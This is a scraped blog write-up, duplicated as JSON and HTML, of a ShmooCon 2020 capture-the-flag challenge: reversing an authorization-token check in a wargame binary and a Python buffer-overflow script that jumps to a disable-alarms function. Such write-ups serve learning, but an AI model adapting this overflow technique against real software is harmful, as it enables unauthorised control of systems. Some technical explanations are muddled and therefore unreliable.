  "articleBody": "At ShmooCon 2020, RET2 Systems was hosting a challenge where they had prototype waterbottles held within a laser system with alarms, run off of a Raspberry Pi. The goal was to access the Raspberry Pi, disable the lasers and alarms, all within their provided Wargames environment.\nProvided with the disassembly, data, source, and python script to run an interactive response, you were left to your own devices to figure out a way to run\n Dawn of the first day Pretty much busy the day we got to ShmooCon, so I didn’t do much with the challenge. I did, however, look at the disassembly, and then noped out because I had never done disassembly (a mistake on my part)\n Dawn of the second day I was strongly against starting my journey into binary exploitation, but because my teammates flatearth and kimpossible had solved the challenge, I thought “if they can do it, i can too.”\nThe day started off with 25 water bottles left, it seemed reasonable that I would find my way to getting one.\nThe code provided had recommended that we look into the function validate_authorization_token, so I set a breakpoint at that function\nbreak validate_authorization_token\r Analyzing the first jump Function validate_authorization_token\r400b1d: push rbp\r400b1e: mov rbp, rsp\r400b21: push rbx\r400b22: sub rsp, 0x28\r400b26: mov qword [rbp-0x28], rdi\r400b2a: mov qword [rbp-0x30], rsi\r400b2e: mov rax, qword [rbp-0x28]\r400b32: mov esi, 0x11\r400b37: mov rdi, rax\r400b3a: call strnlen\r400b3f: cmp rax, 0x11\r400b43: je 0x400b4f\rBefore the first jump function, I saw the following code:\n400b3a: call strnlen\r400b3f: cmp rax, 0x11\rThe disassembly was showing that the code was comparing the length of the string stored into rax (the authorization code that we would eventually generate), to the hex code of 0x11 (17 in decimal). If true, then the next step would be to follow the jump instruction, 400b43: je 0x400b4f.\nI made an authorization token of 00000000000000000, 17 “0’s” just to return true for the compare length function to jump to the next function.\n Analyzing the second jump 400b4f: mov rax, qword [rbp-0x28]\r400b53: add rax, 0x4\r400b57: movzx eax, byte [rax]\r400b5a: cmp al, 0x2d\r400b5c: je 0x400b68\rThe first thing I saw was the compare function at 0x400b5a, that would compare info stored in register al with 0x2d, hex for “-”.\nStarting from the beginning, you see that the quad word stored at rbp-0x28 is stored into rax. After being stored into rax, the byte is shifted by 0x4? The byte[rax] is stored into eax, which then the register al is compared to 0x2d (\"-\" in decimal). This being said, it was seeing if the 4th (0,1,2,3,4) integer was tac, so I changed my authorization token to 0000-000000000000, stepped through the program, and successfully jumped to the next function. In all honesty, this was mostly seeing the 4th integer being compared to tac, and then changing my authorization token and looking at the register to see if al was 0x2d.\n Analyzing the third jump 400b68: mov rax, qword [rbp-0x28]\r400b6c: mov esi, 0x4\r400b71: mov rdi, rax\r400b74: call xorsum\r400b79: mov ebx, eax\r400b7b: mov rax, qword [rbp-0x30]\r400b7f: mov esi, 0x9\r400b84: mov rdi, rax\r400b87: call xorsum\r400b8c: cmp bl, al\r400b8e: je 0x400b9a\rDisclaimer This section is extremely non-scientific, with me testing random numbers and looking at the registers.\nThe disassembly was comparing the two registers “al” and “bl”, which was the first two characters and last two characters of the first half of the authorization token. Instead of analyzing this section, I decided to input random numbers for the first four of the auth token and look at the registers of al and bl to see if they were being xorsum’d correctly. Again, not the best way to do this.\nI was left with 1110- as the first half of my auth token.\n Analyzing the back half of the auth token With the first portion until the tac of the auth token solved correctly, I had the entire 12 back characters to figure out. Luckily, the RET2 team had left a little something for us at 0x400c0d, where the disassembly outright says 400c0d: mov esi, 0x401023 \"ret2 systems\". ret2 systems = 12 characters. Coincidence? I thought not. Instead of looking into whatever voodoo magic the rest of the assembly code was performing, I restarted my program, entered the first 5 of my auth token, and added “ret2 systems” to the end.\nMy thought process here, was if they are comparing the back half to ret2 systems, I should enter ret2 systems to retrieve whatever the program is expecting to become ret2 systems. It surprisingly worked. After stepping through the looped assembly three times, before the program jumps to the next address I inspected the registers and came across 0x00603015 stored into rbp-0x28. It looked familiar (I forgot from where) and so I used x /4x 0x00603015 to display 4 bytes of information stored at that address, and it returned a bunch of hex.\n0x00603015 - the address that held the string “ret2 systems” after it had been XOR’d to provide the back half of the authorization token\nKeep in mind that the hex returned by the program is displayed in little endian, where the information is stored from left into bottom and right into top, per byte. The returned information was 3 bytes, so I had to reassemble from little endian into a normal readable format. \\x89\\xbb\\x69\\x2b\\xdb\\xad\\x64\\x6a\\x8f\\xbb\\x70\\x6a is what I ended up with as the back half of my auth token.Keep in mind that the hex returned by the program is displayed in little endian, where the information is stored from left into bottom and right into top, per byte.

The system now authenticates us as a laser technician, and allows us to disable the lasers by entering disable-systems which would only disable the lasers, while we wanted to disable both the lasers and alarms.\n0x400c4e was a memory address that provided the function to disable the alarms, and I had no idea how to access it. The next step provided a way to access it.\n Whydoesthishateme Unfortunately, my account was reloaded and all of my code was lost.\nSigh\nThankfully, I managed to rerun all the steps I took in order to gain an authorization token, and I had a plan to disable the alarm system this time.\nWith 3 water bottles left, I accessed the debugger and found my authorization token (which had changed), logged in, and wrote a python script to memory overflow the program and jump to the address of the disable_alarms function. Everything worked fine until I reached the point of utilizing the overflow to point the program towards 400c4e, where it started to show (I inspected the rax register to see the overflow) hex 0x0a, which is \\n in decimal. To correct this error, I added 0’s to the back of my pointer to clear that newline, and it worked. In another world, I would have utilized the p64 to pack 0x400c4e into an 8 byte representation and added that to the back of my overflow.\nBelow is the python script that I used to solve the problem.\nimport interact\rimport struct\r# Pack integer 'n' into a 8-Byte representation\rdef p64(n):\rreturn struct.pack('Q', n)\r# Unpack 8-Byte-long string 's' into a Python integer\rdef u64(s):\rreturn struct.unpack('Q', s)[0]\rp = interact.Process()\rdata = p.readuntil('\\n')\rp.sendline('1110-' +'\\x89\\xbb\\x69\\x2b\\xdb\\xad\\x64\\x6a\\x8f\\xbb\\x70\\x6a')\rp.readuntil('\\n')\rp.sendline('disable-system')\rp.readuntil('\\n')\rp.sendline('because i wanted to')\rp.readuntil('\\n')\rp.sendline('disable-system')\rp.readuntil('\\n')\rp.sendline('0'*227+ '\\x4e\\x0c\\x40' +'\\x00')\rp.interactive()\rIt worked perfectly, yet I had missed the chance to get a ret2 systems waterbottle. Kudos to Xasmatwn1 for getting it, and thank you to ret2 systems for hosting this challenge and providing an environment for me to learn.\n",

If true, then the next step would be to follow the jump instruction, <code>400b43:  je      0x400b4f</code>.</p>
<p>I made an authorization token of <code>00000000000000000</code>, 17 &ldquo;0&rsquo;s&rdquo; just to return true for the compare length function to jump to the next function.</p>

<p>Starting from the beginning, you see that the quad word stored at rbp-0x28 is stored into rax. After being stored into rax, the byte is shifted by 0x4? The byte[rax] is stored into eax, which then the register al is compared to 0x2d (&quot;-&quot; in decimal). This being said, it was seeing if the 4th (0,1,2,3,4) integer was tac, so I changed my authorization token to 0000-000000000000, stepped through the program, and successfully jumped to the next function. 
<strong>In all honesty, this was mostly seeing the 4th integer being compared to tac, and then changing my authorization token and looking at the register to see if al was 0x2d.</strong></p>

<p><em>This section is extremely non-scientific, with me testing random numbers and looking at the registers.</em></p>
<p>The disassembly was comparing the two registers &ldquo;al&rdquo; and &ldquo;bl&rdquo;, which was the first two characters and last two characters of the first half of the authorization token. Instead of analyzing this section, I decided to input random numbers for the first four of the auth token and look at the registers of al and bl to see if they were being xorsum&rsquo;d correctly. Again, not the best way to do this.</p>
<p>I was left with <code>1110-</code> as the first half of my auth token.</p>
<hr>
<h2 id="analyzing-the-back-half-of-the-auth-token">Analyzing the back half of the auth token<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-back-half-of-the-auth-token">#</a></h2>
<p>With the first portion until the tac of the auth token solved correctly, I had the entire 12 back characters to figure out. Luckily, the RET2 team had left a little something for us at <code>0x400c0d</code>, where the disassembly outright says <code>400c0d:  mov     esi, 0x401023  &quot;ret2 systems&quot;</code>. ret2 systems = 12 characters. Coincidence? I thought not. Instead of looking into whatever voodoo magic the rest of the assembly code was performing, I restarted my program, entered the first 5 of my auth token, and added &ldquo;ret2 systems&rdquo; to the end.</p>
<p>My thought process here, was if they are comparing the back half to ret2 systems, I should enter ret2 systems to retrieve whatever the program is expecting to become ret2 systems. It surprisingly worked. After stepping through the looped assembly three times, before the program jumps to the next address I inspected the registers and came across 0x00603015 stored into rbp-0x28. It looked familiar (I forgot from where) and so I used <code>x /4x 0x00603015</code> to display 4 bytes of information stored at that address, and it returned a bunch of hex.</p>
<p>0x00603015 - the address that held the string &ldquo;ret2 systems&rdquo; after it had been XOR&rsquo;d to provide the back half of the authorization token</p>
<p>Keep in mind that the hex returned by the program is displayed in little endian, where the information is stored from left into bottom and right into top, per byte. The returned information was 3 bytes, so I had to reassemble from little endian into a normal readable format. <code>\x89\xbb\x69\x2b\xdb\xad\x64\x6a\x8f\xbb\x70\x6a</code> is what I ended up with as the back half of my auth token.Keep in mind that the hex returned by the program is displayed in little endian, where the information is stored from left into bottom and right into top, per byte.

<p>And voila, we now had a full auth token.</p>

<p>After deleting my breakpoints, I could now enter as my auth token through the provided python script. The system now authenticates us as a laser technician, and allows us to disable the lasers by entering <code>disable-systems</code> which would only disable the lasers, while we wanted to disable both the lasers and alarms.</p>
<p><code>0x400c4e</code> was a memory address that provided the function to disable the alarms, and I had no idea how to access it. The next step provided a way to access it.</p>

<p>Unfortunately, my account was reloaded and all of my code was lost.</p>
<p><em>Sigh</em></p>
<p>Thankfully, I managed to rerun all the steps I took in order to gain an authorization token, and I had a plan to disable the alarm system this time.</p>
<p>With 3 water bottles left, I accessed the debugger and found my authorization token (which had changed), logged in, and wrote a python script to memory overflow the program and jump to the address of the disable_alarms function. Everything worked fine until I reached the point of utilizing the overflow to point the program towards <code>400c4e</code>, where it started to show (I inspected the rax register to see the overflow) hex 0x0a, which is \n in decimal. To correct this error, I added 0&rsquo;s to the back of my pointer to clear that newline, and it worked. In another world, I would have utilized the p64 to pack <code>0x400c4e</code> into an 8 byte representation and added that to the back of my overflow.</p>
<p>Below is the python script that I used to solve the problem.</p>
<pre tabindex="0"><code>import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
data = p.readuntil('\n')

p.sendline('1110-' +'\x89\xbb\x69\x2b\xdb\xad\x64\x6a\x8f\xbb\x70\x6a')
p.readuntil('\n')
p.sendline('disable-system')
p.readuntil('\n')
p.sendline('because i wanted to')
p.readuntil('\n')
p.sendline('disable-system')
p.readuntil('\n')

p.sendline('0'*227+ '\x4e\x0c\x40' +'\x00')
p.interactive()
</code></pre><p>It worked perfectly, yet I had missed the chance to get a ret2 systems waterbottle. Kudos to Xasmatwn1 for getting it, and thank you to ret2 systems for hosting this challenge and providing an environment for me to learn.</p>
